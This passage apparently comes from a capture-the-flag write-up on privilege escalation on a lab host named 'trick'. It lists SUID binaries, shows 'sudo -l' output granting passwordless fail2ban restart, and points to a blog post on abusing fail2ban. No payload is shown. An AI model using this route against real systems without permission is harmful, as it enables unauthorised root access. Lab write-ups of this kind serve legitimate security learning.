/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/policykit-1/polkit-agent-helper-1
```

I checked these binaries with `GTFOBins`, but none of these seems working.
Then, the second step is checking `sudo`able commands.

```bash
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

`fail2ban` is sudoable. Let's google if there's any useful information.

<https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7>

Here I found a useful blog post regarding Privilege Escalation abusing `fail2ban`.

